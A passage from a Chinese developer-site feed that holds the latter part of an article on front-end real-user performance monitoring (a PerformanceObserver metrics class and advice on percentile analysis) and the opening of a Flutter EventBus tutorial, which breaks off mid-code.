<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a54d92c0f5c48a8ae742213c9ce52dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=3J9f2e2XSEpaPQhxy8oUNGbdKHw%3D" alt="Clipboard_Screenshot_1765866403.png" loading="lazy"/></p>
<p>（图中仅列举部分指标）</p>
<p>不同大类的指标通常衡量不同的场景的性能情况，我们可以根据相应的需求进行相应指标的获取。换句话说，每个性能指标都有自己独特的衡量价值，各个性能指标理应综合全面的去分析。</p>
<p>用一个时序图来更直观的体现出某些指标处在的阶段：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5cac0732e2324491b0ad219c196ce075~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=43IScXNdGf76CNFsQY2rhYzIy20%3D" alt="Clipboard_Screenshot_1765866417.png" loading="lazy"/></p>
<p>大多数指标是我们衡量网页加载速度的重要依据，这些指标在真实监控中大多都可以通过<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FPerformance_API" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/API/Performance_API" ref="nofollow noopener noreferrer"><code>Performance API</code></a> 获取/计算，总体来讲还是相对轻松的～</p>
<h3 data-id="heading-16">封装一个简单获取RUM的类</h3>
<p>在真实项目中，我们通常不会逐个编写性能数据的获取逻辑，因为这种方式不适合实际应用。更好的方法是通过 <code>PerformanceObserver</code> 进行实时监听，对所需的性能数据进行<strong>动态监控</strong>。一旦监测到相应的指标，就立即进行数据获取和处理。</p>
<p>这里写一个监测各类简单指标的类做个小例子：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TIME</span> = <span class="hljs-number">100</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PerformanceMetrics</span> {
  private <span class="hljs-attr">metrics</span>: any = {};
  private <span class="hljs-attr">observer</span>: <span class="hljs-title class_">PerformanceObserver</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  private <span class="hljs-attr">promise</span>: <span class="hljs-title class_">Promise</span>&lt;any&gt;;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">promise</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">collectPerformance</span>();
  }

	<span class="hljs-comment">// 开始监听</span>
  private <span class="hljs-title function_">startObserving</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">observerCallback</span> = (<span class="hljs-params">list: PerformanceObserverEntryList, observer: PerformanceObserver</span>) =&gt; {
      list.<span class="hljs-title function_">getEntries</span>().<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">entry</span> =&gt;</span> {
        <span class="hljs-comment">// 监听导航数据</span>
        <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">entryType</span> === <span class="hljs-string">'navigation'</span>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">navigationStart</span> = entry.<span class="hljs-property">startTime</span>;
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">domContentLoaded</span> = entry.<span class="hljs-property">domContentLoadedEventEnd</span>;
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">loadEventEnd</span> = entry.<span class="hljs-property">loadEventEnd</span>;
        }

        <span class="hljs-comment">// 监听绘制数据</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">entryType</span> === <span class="hljs-string">'paint'</span>) {
          <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">name</span> === <span class="hljs-string">'first-paint'</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fp</span> = entry.<span class="hljs-property">startTime</span>;
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">name</span> === <span class="hljs-string">'first-contentful-paint'</span>) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fcp</span> = entry.<span class="hljs-property">startTime</span>;
          }
        }

        <span class="hljs-comment">// 监听资源加载数据</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (entry.<span class="hljs-property">entryType</span> === <span class="hljs-string">'resource'</span> &amp;&amp; (entry.<span class="hljs-property">initiatorType</span> === <span class="hljs-string">'script'</span> || entry.<span class="hljs-property">initiatorType</span> === <span class="hljs-string">'link'</span>)) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">resourceLoadTimes</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">resourceLoadTimes</span> || [];
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">resourceLoadTimes</span>.<span class="hljs-title function_">push</span>({
            <span class="hljs-attr">name</span>: entry.<span class="hljs-property">name</span>,
            <span class="hljs-attr">duration</span>: entry.<span class="hljs-property">responseEnd</span> - entry.<span class="hljs-property">startTime</span>
          });
        }
      });

      <span class="hljs-comment">// 如果重要数据收集完毕，停止监听</span>
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fcp</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fp</span>) {
        observer.<span class="hljs-title function_">disconnect</span>();
      }
    };

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceObserver</span>(observerCallback);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">observer</span>.<span class="hljs-title function_">observe</span>({ <span class="hljs-attr">entryTypes</span>: [<span class="hljs-string">'navigation'</span>, <span class="hljs-string">'paint'</span>, <span class="hljs-string">'resource'</span>] });
  }

  <span class="hljs-comment">// 收集性能数据</span>
  <span class="hljs-title function_">collectPerformance</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">startObserving</span>();

        <span class="hljs-keyword">const</span> <span class="hljs-title function_">checkMetricsReady</span> = (<span class="hljs-params"/>) =&gt; {
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fcp</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>.<span class="hljs-property">fp</span>) {
            <span class="hljs-title function_">resolve</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">metrics</span>);
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-built_in">setTimeout</span>(checkMetricsReady, <span class="hljs-variable constant_">TIME</span>);
          }
        };

        <span class="hljs-title function_">checkMetricsReady</span>();
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-title function_">reject</span>(error);
      }
    });
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">getPerformance</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">promise</span>;
  }
}
</code></pre>
<p>使用起来也非常便捷：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">PerformanceMetrics</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"xxx"</span>
<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">const</span> pMs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PerformanceMetrics</span>()
<span class="hljs-keyword">const</span> perf = pMs.<span class="hljs-title function_">getPerformance</span>()
<span class="hljs-comment">// ...</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(perf)
</code></pre>
<p>后续我们可以根据获取到的指标进行分析处理…</p>
<h3 data-id="heading-17">数据上报的维度</h3>
<p>这里我们不说具体的上报方法，而是来说一下数据上报的维度。</p>
<p>为了确保我们RUM分析的全面性，有时仅有这些性能指标的数据是远远不够的，还需要从多个维度综合考虑。数据上报的维度可以分为<strong>常规维度</strong>和<strong>特殊维度。</strong></p>
<h4 data-id="heading-18">常规维度</h4>
<p>常规维度具有普遍性和基础性，适用于大多数的数据收集和监控场景：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2103029ab461452c9e0d42434033e39c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=RoogVd6zX8kc8BK8lRFr6%2F%2FewOk%3D" alt="Clipboard_Screenshot_1765866434.png" loading="lazy"/></p>
<h4 data-id="heading-19">特殊维度</h4>
<p>这些维度主要用于特定的应用场景或者进行深度分析时使用，通常与业务相关，或用于分析性能异常和用户行为：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8dc68440b6a84ea1bba0763e81495b84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGFienp6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766471914&amp;x-signature=gdlPXzvxCQuHvpw1aalG9tvbZ5I%3D" alt="Clipboard_Screenshot_1765866441.png" loading="lazy"/></p>
<h2 data-id="heading-20">分析性能数据及影响因素</h2>
<p>数据辛辛苦苦采集到了，分析数据就别搞得草草率率的了。</p>
<h4 data-id="heading-21">时间分布</h4>
<p>最常见的分析性能数据的切入点就是时间分布了。通常要结合<strong>平均值</strong>、<strong>中位数</strong>和<strong>百分位数</strong>来进行性能评估，单一分析一指标的话往往容易误判用户真实体验。</p>
<ul>
<li>
<p>如果我只看平均值</p>
<p>假设网页加载时间的平均值是<strong>3秒</strong>，但其中少部分用户因网络条件差，加载时间可能超过<strong>10秒</strong>。这些极端值会拉高整体平均值，<strong>掩盖了大多数用户实际较好的体验</strong>。</p>
</li>
<li>
<p>如果我只看中位数</p>
<p>如果中位数是<strong>2.5秒</strong>，说明一半用户加载时间低于这个值。这比平均值更稳定，但依然<strong>无法体现尾部用户的极差体验</strong>。</p>
</li>
<li>
<p>如果我只看百分位数</p>
<p>（你想看百分之多少呢？）</p>
<p>对于高性能要求的业务，<strong>你更应该关注尾部用户的体验</strong>，例如<strong>P95/P99</strong>等。（如果P95为<strong>5秒</strong>，意味着<strong>95%<strong>的用户加载时间低于</strong>5</strong>秒，还有**5%**用户比这慢）</p>
</li>
</ul>
<p>所以分析性能指标时<strong>建议关注百分位数</strong>，对性能的要求越高，使用越大的百分位数，同时在关注百分位数的要结合平均值和中位数一起分析。</p>
<h4 data-id="heading-22">资源类型归类</h4>
<p>我们也可以选择对资源类型进行归类分析，这其实也是对性能分析的一个比较重要的地方。</p>
<p>试想明明你想分析首页加载时间，结果相关资源直接加载失败了，甚至都加载出来，这肯定是在性能监控分析之上更不可能容忍的。</p>
<p>按照资源类型来分析的常见内容有：</p>






























<table><thead><tr><th>资源</th><th>示例</th><th>部分分析</th></tr></thead><tbody><tr><td>JavaScript</td><td>应用包、SDK</td><td>包体积、执行时间、长任务</td></tr><tr><td>CSS</td><td>主样式、字体加载</td><td>阻塞渲染、未使用样式</td></tr><tr><td>图片</td><td>img、icon</td><td>是否压缩、懒加载</td></tr><tr><td>第三方资源</td><td>广告</td><td>是否阻塞加载、错误率</td></tr></tbody></table>
<h4 data-id="heading-23">缓存与加速因素标记</h4>
<p>在分析性能数据的时候，缓存和某些加速因素也会对性能分析造成一定的“误判”影响。好比明明资源很大，加载很慢，结果浏览器缓存了，那我们此时再去监测资源的获取时间就非常“鸡肋”了。</p>
<p>有一些相对比较常见的因素，在分析时可以稍作留意：</p>
<ul>
<li>是否命中浏览器缓存/Service Worker</li>
<li>是否命中CDN加速节点</li>
<li>DNS是否走了预解析</li>
</ul>
<h2 data-id="heading-24">写在最后</h2>
<p>本文讲的内容多以概念性的东西为主，算不上深入浅出不过还是希望这篇文章可以对你有一些帮助，此外，文章中相对结合实际较少，理论性的内容终究还是要通过实践来加深理解。</p>
<p>如果文章里有错误或者需要补充的地方可以在评论区留言，如果可以的话也可以在评论区讨论交流呀，感谢大家🙏</p>
<p>（如果真的看到这了，可否三连支持下呢～）</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[flutter-使用EventBus实现组件间数据通信]]></title>    <link>https://juejin.cn/post/7583226204036513833</link>    <guid>https://juejin.cn/post/7583226204036513833</guid>    <pubDate>2025-12-15T00:40:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583226204036513833" data-draft-id="7581117416811544619" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" flutter-使用EventBus实现组件间数据通信"/> <meta itemprop="keywords" content="前端,Flutter,Android"/> <meta itemprop="datePublished" content="2025-12-15T00:40:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鹏多多"/> <meta itemprop="url" content="https://juejin.cn/user/747323639737191"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             flutter-使用EventBus实现组件间数据通信
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/747323639737191/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鹏多多
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T00:40:53.000Z" title="Mon Dec 15 2025 00:40:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"•";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><h2 data-id="heading-0">1. 效果预览</h2>
<p>在 Flutter 应用开发中，组件间的通信是一个常见且重要的需求。当涉及到父子组件之间复杂的交互时，使用事件总线（Event Bus）可以有效地实现解耦和灵活的消息传递。本文将通过一段具体的代码，详细介绍如何在 Flutter 中利用事件总线实现父子组件之间的通信。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebfa70468af644018b55aeea80cdbdde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bmP5aSa5aSa:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766364053&amp;x-signature=lY2mGdzxw4VH3CvdYz6bcOCybFU%3D" alt="效果预览" loading="lazy"/></p>
<h2 data-id="heading-1">2. 安装插件</h2>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">event_bus:</span> <span class="hljs-string">^2.0.0</span>
</code></pre>
<p>创建eventBus.dart文件，写入以下内容：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:event_bus/event_bus.dart'</span>;

EventBus eventBus = EventBus();

<span class="hljs-comment">/// <span class="markdown">通知测试</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BusNotificationTest</span> </span>{
  <span class="hljs-built_in">int</span> index;
  BusNotificationTest(<span class="hljs-keyword">this</span>.index);
}
</code></pre>
<h2 data-id="heading-2">3. 结构分析</h2>
<p>这段代码展示了如何在 Flutter 中通过事件总线实现父子组件之间的通信，具体功能为：在父组件EventBusParentPage中，用户点击按钮后，会触发一个通知事件，子组件EventBusChildPage监听该事件，并根据事件携带的信息改变自身的背景颜色。</p>
<ol>
<li>父组件：EventBusParentPage</li>
</ol>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">事件Bus通知父类</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventBusParentPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">const</span> EventBusParentPage({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  EventBusParentPageState createState() =&gt; EventBusParentPageState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EventBusParentPageState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">EventBusParentPage</span>&gt; </span>{
  <span class="hljs-comment">/// <span class="markdown">颜色索引</span></span>
  <span class="hljs-built_in">int</span> index = <span class="hljs-number">0</span>;

  <span class="hljs-comment">/// <span class="markdown">通知变色</span></span>
  <span class="hljs-keyword">void</span> handleColorChange() {
    index++;
